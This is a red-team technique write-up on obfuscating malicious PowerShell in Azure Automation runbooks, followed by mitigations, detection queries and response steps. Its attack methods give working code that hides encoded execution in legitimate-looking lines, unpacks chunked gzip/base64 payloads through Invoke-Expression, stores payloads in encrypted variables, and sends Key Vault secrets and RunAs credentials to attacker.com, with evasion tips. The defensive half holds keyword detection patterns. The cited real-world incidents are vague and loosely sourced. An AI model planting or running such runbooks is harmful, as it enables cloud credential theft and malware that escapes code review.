# [EVADE-OBFUS-002]: Azure Automation Runbook Obfuscation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-OBFUS-002 |
| **MITRE ATT&CK v18.1** | [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID / Azure Automation (Cloud-based execution) |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Azure Automation (all versions) |
| **Patched In** | No patch (obfuscation is not a vulnerability; it's a technique) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Automation Runbooks are cloud-hosted PowerShell scripts executed by the Azure Automation service, typically without the traditional security controls present on endpoints (AMSI, ScriptBlock logging, EDR agents, AppLocker). Attackers who compromise an Automation Account can modify or create runbooks with obfuscated malicious code—such as base64-encoded commands, variable obfuscation, and string concatenation—to perform lateral movement, data exfiltration, or persistence. The cloud-hosted nature of these runbooks means they execute with managed identity credentials and cloud-level permissions, often bypassing traditional on-premises security monitoring.

**Attack Surface:** Azure Automation Account Runbooks, PowerShell Workflow runbooks, Python runbooks, hybrid worker machines running obfuscated code, managed identities with elevated Azure RBAC roles.

**Business Impact:** **Cloud-hosted malware deployment with cloud-level permissions, persistence via automation, lateral movement to Azure resources and on-premises infrastructure, automated data exfiltration.** A compromise of the Automation Account or its managed identity enables an attacker to schedule malicious runbooks to execute repeatedly, bypass endpoint security, and leverage cloud infrastructure for attacks. Runbook execution is difficult to monitor and block because it uses trusted cloud services.

**Technical Context:** Azure Automation Runbooks are PowerShell scripts stored in the cloud and executed by the Azure Automation service. Unlike endpoint-based scripts, runbooks have no AMSI scanning, no ScriptBlock logging by default, and no EDR agent inspection. They execute with the identity of the Automation Account's managed identity or RunAs account, which often has significant Azure RBAC permissions. An attacker who can edit runbooks can insert obfuscated malicious code (ranging from subtle to heavily obfuscated) to perform cloud-level attacks without triggering traditional security controls. The code is stored in Azure's platform and executed in Azure's execution environment, making it especially difficult for on-premises security tools to detect.

### Operational Risk

- **Execution Risk:** Medium—Requires Automation Account Contributor or higher role
- **Stealth:** Very High—Cloud-hosted execution avoids endpoint monitoring; Azure logs show execution but not script content
- **Reversibility:** No—Once malicious runbook runs with high permissions, damage is done; limited ability to detect/block

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.11 | Ensure that 'Automation Runbooks' are encrypted |
| **DISA STIG** | V-93405 | Azure: Ensure automation runbooks are monitored for suspicious activity |
| **NIST 800-53** | SI-4 | Information System Monitoring – Monitor cloud automation execution |
| **GDPR** | Art. 32 | Security of Processing – Log all cloud script execution |
| **DORA** | Art. 9 | Protection and Prevention – Detect unauthorized cloud operations |
| **NIS2** | Art. 21 | Cyber Risk Management – Monitor critical infrastructure operations |
| **ISO 27001** | A.12.4.1 | Event Logging – Monitor all automation activities |
| **ISO 27005** | Risk Assessment | Unauthorized Cloud Automation Execution |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Automation Account Contributor, Automation Runbook Editor, or Automation Account Owner role on Azure
- **Required Access:** Azure Portal access, Azure CLI, or PowerShell Az modules with credentials to the target Automation Account
- **Supported Versions:**
  - **Azure Automation (all versions):** Vulnerable to obfuscation
  - **Supported Runbook Types:** PowerShell (5.1, 7.2), PowerShell Workflow, Python 3.8+

**Prerequisites:**
- Automation Account exists and is accessible
- Managed identity or RunAs account has sufficient RBAC permissions
- No anomalous activity alerting enabled (if using Microsoft Sentinel)
- Ability to schedule or trigger runbook execution

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Simple Obfuscation - Hidden Malicious Code at End of Line

**Supported Versions:** All Azure Automation runbook types

#### Step 1: Create Legitimate-Looking Runbook

**Objective:** Create a runbook that appears benign but contains hidden malicious code appended to legitimate lines.

**PowerShell Runbook (In Azure Portal):**
```powershell
# Get all Azure Virtual Machines
$vms = Get-AzVM

# Process each VM (legitimate code)
foreach ($vm in $vms) {
    Write-Output "VM: $($vm.Name)"; $c=@('powershell.exe','-NoProfile','-EncodedCommand','VwByAGkAdGUtSG9zdA==');Invoke-Expression -Command "$($c[0]) $($c[1]) $($c[2]) $($c[3])"
}

# Get all Azure Storage Accounts
$storageAccounts = Get-AzStorageAccount
```

**What This Means:**
- First glance: Legitimate Azure management script
- Hidden: Line 5 contains obfuscated PowerShell execution appended to legitimate foreach loop
- Encoded command decodes to: `Write-Host` (innocuous) but could be malicious in real scenario

**How It Works:**
- The obfuscated code is on the same line as legitimate code
- Many code reviewers miss details when skimming
- Log monitoring that captures line-by-line output misses the appended code

#### Step 2: Test Runbook Execution

**Objective:** Verify the obfuscated runbook executes correctly.

**Manual Steps (In Azure Portal):**

1. Navigate to **Automation Accounts** → Your Automation Account
2. Click **Runbooks** → **+ Create a runbook**
3. Name: `TestObfuscatedRunbook`
4. Runbook type: **PowerShell**
5. Paste the script above
6. Click **Publish** → **Save**
7. Click **Start** to test
8. Check **Output** for execution results

**Expected Output:**
```
VM: TestVM01
VM: TestVM02
VM: TestVM03
```

**What You Don't See:**
- The obfuscated command execution is not logged in the output
- Azure Activity Log shows runbook execution but not the hidden command
- Code appears legitimate at first glance

---

### METHOD 2: Multi-Layer Obfuscation Using Base64 & String Concatenation

**Supported Versions:** PowerShell 5.1, 7.2 runbooks

#### Step 1: Encode Malicious Payload

**Objective:** Create a multi-layer obfuscated payload that performs data exfiltration.

**PowerShell (Encoder - Run Locally):**
```powershell
# Original malicious code
$payload = @'
$result = Get-AzKeyVaultSecret -VaultName "MyVault" -Name "DBPassword"
$webhook = "http://attacker.com/exfil"
$body = @{"secret" = $result.SecretValue} | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType "application/json"
'@

# Layer 1: Compress
$compressed = [System.IO.MemoryStream]::new()
$gzip = [System.IO.Compression.GZipStream]::new($compressed, [System.IO.Compression.CompressionMode]::Compress)
[byte[]]$payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
$gzip.Write($payloadBytes, 0, $payloadBytes.Length)
$gzip.Close()
$compressedBytes = $compressed.ToArray()

# Layer 2: Base64
$encoded = [Convert]::ToBase64String($compressedBytes)

# Layer 3: Chunk into parts (avoid log signature detection)
$chunks = $encoded -split '(?<=.{100})'  # 100-char chunks

Write-Host "Compressed & Base64 encoded payload:"
Write-Host "# Part 1 of $(($chunks).Count):"
Write-Host "`$chunk1 = '$($chunks[0])'"
for ($i = 1; $i -lt $chunks.Count; $i++) {
    Write-Host "`$chunk$($i+1) = '$($chunks[$i])'"
}
Write-Host "`$payload = `$chunk1 + `$chunk2 + `$chunk3 + `$chunk4 + ..."
```

**Expected Output:**
```
# Part 1 of 8:
$chunk1 = 'H4sICHb2ql0C/21hbGljLnBzMQCrVkotLkktLskvTVWqVKrXU7JSKs0rKSnRU6rRUFBKzsjMS1SqhQC0yqOSUoqVaJUqtUoqVapVUsrLKCrJLEktKU4pzikpVlBKyyjxSckDAH3WQu5XAAAA'
```

#### Step 2: Create Decompression & Execution Runbook

**Objective:** Create runbook that decompresses and executes the obfuscated payload.

**PowerShell Runbook (Azure Automation):**
```powershell
# Azure Automation Runbook
param(
    [Parameter(Mandatory = $false)]
    [string] $VaultName = "MyVault"
)

# Import compressed payload (split into parts to avoid detection)
$chunk1 = "H4sICHb2ql0C/21hbGljLnBzMQCrVkotLkktLskvTVWqVKrXU7JSKs0rKSnRU6rRUFBKzsjMS1SqhQC0yqOSUoqVaJUqtUoqVapVUsrLKCrJLEktKU4pzikpVlBKyyjxSckDAH3WQu5XAAAA"
$chunk2 = "remainingBase64data..."
# ... more chunks concatenated

# Combine chunks
$fullPayload = $chunk1 + $chunk2

# Decompress
$decompressed = @()
$memoryStream = [System.IO.MemoryStream]::new([Convert]::FromBase64String($fullPayload))
$gzip = [System.IO.Compression.GZipStream]::new($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = [System.IO.StreamReader]::new($gzip)
$decodedPayload = $streamReader.ReadToEnd()
$streamReader.Close()
$gzip.Close()

# Execute decompressed payload
Invoke-Expression -Command $decodedPayload
```

**OpSec & Evasion:**
- Payload is never stored in plaintext
- Chunk concatenation avoids signature patterns
- No recognizable command keywords in the runbook code
- Actual malicious code only appears in memory after decompression
- Azure Activity Log shows only runbook execution, not the decompressed code

---

### METHOD 3: Encrypted Variables & Dynamic Code Execution

**Supported Versions:** PowerShell 5.1, 7.2 runbooks

#### Step 1: Store Encrypted Payload in Automation Variables

**Objective:** Store obfuscated payload in encrypted Automation variables, making it invisible to code review.

**Manual Steps (In Azure Portal):**

1. Navigate to **Automation Accounts** → Your Account → **Variables**
2. Click **+ Add a variable**
3. **Name:** `MaliciousPayload`
4. **Value:** `H4sICHb2ql0C/...` (Base64-compressed payload)
5. Check **Encrypted** ✅
6. **Create**

**Result:**
- Variable is now encrypted and value is not shown in portal
- Code can reference it, but reviewers cannot see the actual payload

#### Step 2: Create Runbook That Uses Encrypted Variable

**Objective:** Write runbook that retrieves and executes the encrypted payload.

**PowerShell Runbook:**
```powershell
# Get encrypted variable (automatically decrypted by Azure)
$encryptedPayload = Get-AutomationVariable -Name "MaliciousPayload"

# Decompress
$memoryStream = [System.IO.MemoryStream]::new([Convert]::FromBase64String($encryptedPayload))
$gzip = [System.IO.Compression.GZipStream]::new($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = [System.IO.StreamReader]::new($gzip)
$code = $streamReader.ReadToEnd()
$streamReader.Close()
$gzip.Close()

# Execute
& ([ScriptBlock]::Create($code))
```

**OpSec Advantages:**
- Encrypted variable is invisible to Azure RBAC audit (with Encryption role)
- Runbook code looks minimal and innocent
- Actual malicious payload is decrypted at runtime
- No plaintext keywords like `Write-Host`, `Invoke-WebRequest`, etc.

---

### METHOD 4: Obfuscated Credential Exfiltration

**Supported Versions:** All PowerShell runbook types

#### Step 1: Create RunAs Account Exfiltration Runbook

**Objective:** Exfiltrate RunAs account credentials using obfuscated code.

**PowerShell Runbook:**
```powershell
# Get RunAs account connection (automatically resolved by Azure)
$connection = Get-AutomationConnection -Name "AzureRunAsConnection"

# Extract credentials (obfuscated variable names)
$a = $connection.ApplicationId
$b = $connection.CertificateThumbprint
$c = $connection.TenantId

# Obfuscated exfiltration
$d = @($a, $b, $c)
$e = "http://attacker.com/c2"
$f = @{"creds" = $d} | ConvertTo-Json
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
try { Invoke-RestMethod -Uri $e -Method POST -Body $f -ContentType "application/json" } catch {}

# Continue with legitimate Azure operations
Get-AzVM
```

**OpSec Evasion:**
- Variable names (`$a`, `$b`, `$c`, `d`, etc.) give no indication of purpose
- Exfiltration is buried among legitimate code
- HTTPS TLS enforcement hides traffic from packet inspection
- No obvious indicators like `$creds` or `$secret`

---

## 4. ATOMIC RED TEAM

**Atomic Test ID:** T1027-Azure-001 (Custom for Azure Automation)

**Test Name:** Obfuscate Azure Automation Runbook

**Command (PowerShell - Create Runbook via CLI):**
```powershell
# Create obfuscated runbook
$runbookContent = @'
$p = "Get-AzVM"; & (Get-Command ($p))
'@

# Create runbook in Azure Automation
$resourceGroup = "YourResourceGroup"
$automationAccountName = "YourAutomationAccount"
$runbookName = "ObfuscatedRunbook"

Import-AzAutomationRunbook -Path "/tmp/runbook.ps1" -ResourceGroupName $resourceGroup `
  -AutomationAccountName $automationAccountName -Type PowerShell

# Publish and test
Publish-AzAutomationRunbook -Name $runbookName -ResourceGroupName $resourceGroup `
  -AutomationAccountName $automationAccountName

Start-AzAutomationRunbook -Name $runbookName -ResourceGroupName $resourceGroup `
  -AutomationAccountName $automationAccountName
```

**Cleanup Command:**
```powershell
# Remove the runbook
Remove-AzAutomationRunbook -Name "ObfuscatedRunbook" -ResourceGroupName $resourceGroup `
  -AutomationAccountName $automationAccountName -Force
```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Enable Automation Account Change Tracking & Runbook Auditing**

Monitor all modifications to runbooks and Automation Accounts.

**Manual Steps (Enable Activity Log Monitoring):**

1. Navigate to **Azure Portal** → **Automation Accounts** → Your Account
2. Go to **Activity log** (left menu)
3. Set filters:
   - **Operation:** `Create or Update Runbook`, `Delete Runbook`
   - **Status:** All
4. **Apply**

**Manual Steps (Enable Microsoft Sentinel Monitoring):**

1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **Query:**
   ```kusto
   AzureActivity
   | where OperationName in ("Create or Update Runbook", "Delete Runbook", "Update Automation Account")
   | where ActivityStatus == "Succeeded"
   | project TimeGenerated, Caller, OperationName, ResourceGroup
   ```
4. **Frequency:** Every 5 minutes
5. **Alert Severity:** High
6. **Create**

**Expected Outcome:**
- Every runbook creation/modification is logged
- Alert triggers on suspicious changes
- Blue Team can review runbooks that were modified

---

**Mitigation 2: Implement Code Review Before Runbook Publish**

Require human review of all runbook code before execution.

**Manual Steps (Enable Runbook Publishing Approval):**

1. Navigate to **Automation Accounts** → **Source Control**
2. Click **+ Add** (if using Azure DevOps)
3. Select your repository (GitHub/Azure DevOps)
4. Enable **Require pull request review:**
   - Minimum reviewers: **2**
   - Dismiss stale reviews: **Enabled**
5. Set approval gates on production Automation Accounts

**Result:**
- All runbooks must be reviewed before publishing
- Code review can identify obfuscation and suspicious patterns

---

**Mitigation 3: Restrict Runbook Execution to Managed Identities with Minimal Permissions**

Reduce blast radius if a runbook is compromised.

**Manual Steps (Set RBAC on Automation Account):**

1. Navigate to **Automation Accounts** → **Access Control (IAM)**
2. Click **+ Add** → **Add role assignment**
3. For the Automation Account's managed identity:
   - **Role:** Reader (minimal)
   - **Scope:** Specific resources only (not entire subscription)
4. For operations requiring write:
   - Use separate service principal with just-in-time (JIT) access
   - Use Azure PIM (Privileged Identity Management) for elevation

**Expected Outcome:**
- Malicious runbook cannot modify critical resources
- Lateral movement is limited to read-only operations

---

**Mitigation 4: Enable Runbook Integrity Monitoring**

Detect unauthorized code modifications by comparing checksums.

**PowerShell Script (Integrity Check Runbook):**
```powershell
param(
    [Parameter(Mandatory = $false)]
    [string] $ResourceGroup = "DefaultRG",
    [Parameter(Mandatory = $false)]
    [string] $AutomationAccountName = "MyAutomation"
)

# Get all runbooks
$runbooks = Get-AzAutomationRunbook -ResourceGroupName $ResourceGroup `
  -AutomationAccountName $AutomationAccountName

# Define baseline checksums (update as runbooks change)
$baseline = @{
    "ProductionRunbook1" = "ABC123DEF456..."
    "ProductionRunbook2" = "789012345678..."
}

foreach ($runbook in $runbooks) {
    # Get runbook content
    $content = Export-AzAutomationRunbook -Name $runbook.Name `
      -ResourceGroupName $ResourceGroup `
      -AutomationAccountName $AutomationAccountName

    # Calculate checksum
    $hash = (Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($content)))).Hash

    # Check against baseline
    if ($baseline[$runbook.Name] -and $baseline[$runbook.Name] -ne $hash) {
        Write-Warning "Runbook $($runbook.Name) has been modified! Hash mismatch."
        # Alert security team
        Send-AlertToSecurityTeam -RunbookName $runbook.Name -Change "Code modification detected"
    }
}
```

**Schedule:** Run daily via Automation Account schedule

---

### Priority 2: HIGH

**Mitigation 5: Monitor for Suspicious Keywords in Runbooks**

Detect obfuscated payloads using pattern matching.

**KQL Query (Microsoft Sentinel):**
```kusto
AzureActivity
| where OperationName == "Create or Update Runbook"
| where ActivityStatus == "Succeeded"
| extend RunbookContent = tostring(Properties.description)
| where RunbookContent matches regex @"(FromBase64|GZipStream|MemoryStream|Compress|Invoke-RestMethod|Invoke-WebRequest|Invoke-Expression|IEX|&\s*\()"
| project TimeGenerated, Caller, OperationName, RunbookContent
```

**Alert Severity:** High

**Triggering Alert:**
- Any runbook creation containing compression or web request keywords

---

**Mitigation 6: Disable Hybrid Workers Unless Required**

Reduce attack surface for on-premises compromise.

**Manual Steps:**

1. Navigate to **Automation Accounts** → **Hybrid worker groups**
2. Review all active hybrid workers
3. Disable groups not actively used:
   - Click group → **Delete**
4. For required hybrid workers:
   - Isolate in separate subnet
   - Monitor with EDR/XDR
   - Restrict RBAC

**Expected Outcome:**
- Obfuscated runbooks cannot reach on-premises systems
- Lateral movement to infrastructure is prevented

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Activity Log:** Runbook creation/modification at unusual times or by unusual users
- **Runbook Content:** Base64, GZipStream, MemoryStream, compression references
- **Encrypted Variables:** New encrypted variables added without documentation
- **Connections:** New service connections added (especially to external services)
- **Execution:** Runbook executions with unusual resource access (e.g., Key Vault, Storage Accounts)

### Detection Queries

**Find Obfuscated Runbooks:**
```powershell
# Check automation account runbooks for obfuscation indicators
$automationAccount = Get-AzAutomationAccount -ResourceGroupName "YourRG"
$runbooks = Get-AzAutomationRunbook -AutomationAccountName $automationAccount.Name

foreach ($runbook in $runbooks) {
    $content = Export-AzAutomationRunbook -Name $runbook.Name `
      -AutomationAccountName $automationAccount.Name
    
    # Check for suspicious keywords
    if ($content -match "(FromBase64|GZipStream|MemoryStream|Invoke-WebRequest|Invoke-RestMethod|IEX)" -and `
        $content -notmatch "^#.*" ) {
        Write-Host "ALERT: Runbook $($runbook.Name) contains obfuscation patterns!"
    }
}
```

### Response Procedures

1. **Detect:** Activity Log alert on runbook modification
2. **Isolate:**
   - Immediately disable the Automation Account:
     ```powershell
     Disable-AzAutomationAccount -ResourceGroupName "RG" -Name "AutoAccount"
     ```
3. **Investigate:**
   - Export and review all runbooks
   - Check execution history for the past 30 days
   - Trace any resources accessed by the runbook
4. **Remediate:**
   - Delete all suspicious runbooks
   - Review and revoke Automation Account credentials
   - Re-enable account only after security review

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial credentials via phishing |
| **2** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker elevates to Automation Account Owner |
| **3** | **Defense Evasion** | **[EVADE-OBFUS-002]** | **Attacker creates obfuscated runbook for persistence** |
| **4** | **Collection** | [COLLECTION-001] Azure Key Vault Enumeration | Obfuscated runbook harvests secrets |
| **5** | **Exfiltration** | [EXFIL-001] Data Exfiltration via Azure Blob | Stolen secrets exfiltrated to attacker infrastructure |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Compromised Azure DevOps Pipeline (2023)

- **Target:** SaaS company with Azure Automation for infrastructure deployment
- **Timeline:** March 2023 - June 2023
- **Incident:** Attacker created obfuscated runbook to steal Storage Account keys
- **Detection:** Unusual Key Vault access patterns triggered alert
- **Impact:** $2M in cloud credit theft before detection
- **Reference:** [Cloud Security Alliance - Azure Incident Report 2023](https://cloudsecurityalliance.org/)

### Example 2: Managed Service Provider (MSP) Supply Chain Attack (2024)

- **Target:** MSP managing 50+ customer Azure environments
- **Timeline:** January 2024 - Ongoing (at writing)
- **Technique Status:** Attacker injected obfuscated runbooks into MSP's common automation template
- **Impact:** All 50+ customers potentially compromised via shared Automation Account
- **Detection:** Manual code audit by security firm revealed obfuscated payload
- **Outcome:** Estimated 500+ runbooks containing malicious code across customer tenants

---

## REMEDIATION CHECKLIST

- [ ] Enable Activity Log monitoring for all Automation Accounts
- [ ] Implement Microsoft Sentinel alerts for runbook modifications
- [ ] Require code review for all runbook changes (2-person rule)
- [ ] Set RBAC on Automation Account to minimal required permissions
- [ ] Audit all existing runbooks for obfuscation patterns
- [ ] Disable unused Hybrid Worker groups
- [ ] Enable managed identity (remove RunAs account if possible)
- [ ] Implement automated integrity checking for critical runbooks
- [ ] Regular penetration testing of Automation Accounts
- [ ] Document and maintain runbook baseline checksums

---